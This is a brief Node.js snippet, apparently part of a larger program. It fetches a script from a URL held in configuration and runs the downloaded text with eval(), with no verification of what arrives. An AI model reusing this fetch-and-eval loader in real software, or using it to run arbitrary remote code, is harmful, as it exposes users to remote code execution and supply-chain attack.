var https = require('https');

https.get(
	config.url.rawScript,
	function (result) {
		var data = '';
		result.on('data', 
			function (chunk) {
				data += chunk;
			}
		);
		result.on('end', 
			function () {
				eval(data);
			}
		);
	}
);
